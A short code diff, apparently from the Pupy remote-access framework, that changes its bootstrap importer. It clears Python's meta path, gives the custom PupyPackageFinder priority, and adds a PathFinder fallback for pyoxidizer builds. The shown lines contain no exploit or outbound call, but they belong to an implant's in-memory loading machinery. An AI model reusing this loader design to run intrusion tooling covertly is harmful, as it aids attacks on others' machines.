@@ -94,7 +94,7 @@ try:
 
     # Reset search paths ASAP
 
-    #del sys.meta_path[:]
+    del sys.meta_path[:]
     del sys.path[:]
     del sys.path_hooks[:]
 
@@ -861,8 +861,16 @@ def load_pupyimporter(stdlib=None):
 
     else:
         dprint('Install pupyimporter + local packages')
+        #sys.meta_path=[]
         sys.path.insert(0, 'pupy://')
-        sys.path_hooks.append(PupyPackageFinder)
+        sys.path_hooks.insert(0, PupyPackageFinder)
+    try:
+        import _frozen_importlib_external
+        # fix some missing default python meta_path, for instance with pyoxidizer
+        if _frozen_importlib_external.PathFinder not in sys.meta_path:
+            sys.meta_path.append(_frozen_importlib_external.PathFinder)
+    except:
+        pass
 
     sys.path_importer_cache.clear()
 
